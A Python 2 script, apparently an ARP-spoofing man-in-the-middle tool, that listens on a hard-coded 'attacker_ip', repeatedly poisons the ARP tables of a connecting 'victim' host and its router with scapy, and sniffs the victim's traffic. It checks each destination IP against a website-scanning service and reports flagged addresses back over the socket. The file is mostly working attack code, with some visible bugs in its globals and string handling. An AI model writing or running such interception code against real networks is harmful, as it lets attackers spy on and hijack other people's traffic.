import subprocess
import scapy.all
import time
import threading
import urllib2
import BeautifulSoup
import socket
import multiprocessing

attacker_ip='192.9.13.229'
sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
contents=''
victim_ip=''
router_ip=''
client=''

def checking_ip(ip_address):
    scores={'Low Risk':1, 'Medium Risk':2, 'High Risk':5}
    score_sum=0
    a=urllib2.urlopen('https://sitecheck.sucuri.net/results/'+ip_address)
    html=BeautifulSoup.BeautifulSoup(a)
    result=html.findAll('table', attrs={'class':'table scan-findings'})
    if len(result) <=0:
        return 0
    result=result[0].findAll('td')
    if result[2]=='Critical':
        return 0
    for i in range(len(result)/4):
        try:
            print result[i*4+2].text
            score_sum+=scores[result[i*4+2].text]
        except:
            score_sum+=10
    if score_sum > 5:
        client.send(ip_address)
        with open('test.txt', 'a') as f:
            f.write(ip_address+' ')
        contents.append(ip_address)

def getMac(host):
    a=subprocess.Popen(["arp", "-a"], stdout=subprocess.PIPE)
    a=a.stdout.read().split('\n')[:-1]
    for i in a:
        tmp=i.split(' ')
        if host in tmp[1]:
            return tmp[3]

def attack(victim_ip, router_ip):
    victim_mac=getMac(victim_ip)
    router_mac=getMac(router_ip)
    scapy.all.send(scapy.all.ARP(op=2, pdst=victim_ip, psrc=router_ip, hwdst=victim_mac))
    scapy.all.send(scapy.all.ARP(op=2, pdst=router_ip, psrc=victim_ip, hwdst=router_mac))

def recover(victim_ip, router_ip):
    victim_mac=getMac(victim_ip)
    router_mac=getMac(router_ip)
    scapy.all.send(scapy.all.ARP(op=2, pdst=router_ip, psrc=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac), count=3)
    scapy.all.send(scapy.all.ARP(op=2, pdst=victim_ip, psrc=router_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=router_mac), count=3)

def pr(x):
    if x.haslayer('IP') and x['IP'].src == victim_ip:
        print x['IP'].dst
        checking_ip(x['IP'].dst)

def sniffing(clients, victim_ip, contents):
    scapy.all.sniff(prn=pr)

def main(client, client_address):
    #if os.geteuid() != 0:
    #    sys.exit("[!] Please run as root")
    victim_ip=client_address[0]
    router_ip=client.recv(1024)
    print victim_ip, router_ip
    with open('test.txt', 'r') as f:
        contents=f.readline()
    contents=contents.split(' ')
    if getMac(router_ip) == None:
        print 'We can not find router mac address'
        return

    if getMac(victim_ip) == None:
        print 'we can not find victim mac address'
        return
    t=threading.Thread(target=sniffing, args=(client, victim_ip, contents))
    t.start()


    try:
        while True:
            attack(victim_ip, router_ip)
            time.sleep(2)
    except Exception, err:
        print err
        recover(victim_ip, router_ip)
        t.join(10)
        exit()



if __name__ == '__main__':
    sock.bind((attacker_ip, 9876))
    sock.listen(5)
    client, client_address=sock.accept()
    p=multiprocessing.Process(target=main, args=(client, client_address))
    p.start()